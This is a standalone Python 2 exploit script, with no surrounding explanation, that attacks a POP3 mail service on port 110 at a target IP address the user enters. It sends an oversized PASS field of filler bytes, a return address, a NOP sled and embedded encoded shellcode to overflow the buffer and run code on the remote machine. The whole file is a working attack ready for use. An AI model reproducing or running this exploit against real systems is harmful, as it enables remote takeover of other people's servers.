#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

shellcode = ("\xba\x19\x28\x99\x34\xda\xde\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x83\xc0\x04\x31\x50\x0e\x03\x49\x26\x7b\xc1\x95\xde\xf9"
"\x2a\x65\x1f\x9e\xa3\x80\x2e\x9e\xd0\xc1\x01\x2e\x92\x87\xad"
"\xc5\xf6\x33\x25\xab\xde\x34\x8e\x06\x39\x7b\x0f\x3a\x79\x1a"
"\x93\x41\xae\xfc\xaa\x89\xa3\xfd\xeb\xf4\x4e\xaf\xa4\x73\xfc"
"\x5f\xc0\xce\x3d\xd4\x9a\xdf\x45\x09\x6a\xe1\x64\x9c\xe0\xb8"
"\xa6\x1f\x24\xb1\xee\x07\x29\xfc\xb9\xbc\x99\x8a\x3b\x14\xd0"
"\x73\x97\x59\xdc\x81\xe9\x9e\xdb\x79\x9c\xd6\x1f\x07\xa7\x2d"
"\x5d\xd3\x22\xb5\xc5\x90\x95\x11\xf7\x75\x43\xd2\xfb\x32\x07"
"\xbc\x1f\xc4\xc4\xb7\x24\x4d\xeb\x17\xad\x15\xc8\xb3\xf5\xce"
"\x71\xe2\x53\xa0\x8e\xf4\x3b\x1d\x2b\x7f\xd1\x4a\x46\x22\xbe"
"\xbf\x6b\xdc\x3e\xa8\xfc\xaf\x0c\x77\x57\x27\x3d\xf0\x71\xb0"
"\x42\x2b\xc5\x2e\xbd\xd4\x36\x67\x7a\x80\x66\x1f\xab\xa9\xec"
"\xdf\x54\x7c\xa2\x8f\xfa\x2f\x03\x7f\xbb\x9f\xeb\x95\x34\xff"
"\x0c\x96\x9e\x68\xa6\x6d\x49\x9d\x3c\x6d\xf6\xc9\x40\x6d\x09"
"\xb1\xcc\x8b\x63\xd5\x98\x04\x1c\x4c\x81\xde\xbd\x91\x1f\x9b"
"\xfe\x1a\xac\x5c\xb0\xea\xd9\x4e\x25\x1b\x94\x2c\xe0\x24\x02"
"\x58\x6e\xb6\xc9\x98\xf9\xab\x45\xcf\xae\x1a\x9c\x85\x42\x04"
"\x36\xbb\x9e\xd0\x71\x7f\x45\x21\x7f\x7e\x08\x1d\x5b\x90\xd4"
"\x9e\xe7\xc4\x88\xc8\xb1\xb2\x6e\xa3\x73\x6c\x39\x18\xda\xf8"
"\xbc\x52\xdd\x7e\xc1\xbe\xab\x9e\x70\x17\xea\xa1\xbd\xff\xfa"
"\xda\xa3\x9f\x05\x31\x60\xaf\x4f\x1b\xc1\x38\x16\xce\x53\x25"
"\xa9\x25\x97\x50\x2a\xcf\x68\xa7\x32\xba\x6d\xe3\xf4\x57\x1c"
"\x7c\x91\x57\xb3\x7d\xb0")

target=raw_input("Enter IP of machine to target: ")

buffer = "A"*2606+"\x8f\x35\x4a\x5f"+"\x90"*16+shellcode+"C"*(3500-2606-4-351-16)

try:
	print "\nSending Exploit..."
	s.connect((target,110))
	data=s.recv(1024)
	s.send('USER username'+'\r\n')
	data=s.recv(1024)
	s.send('PASS '+buffer+'\r\n')
	print "\n Exploit sent..."
	
except:
	print "FAILED.Couldnt connect"
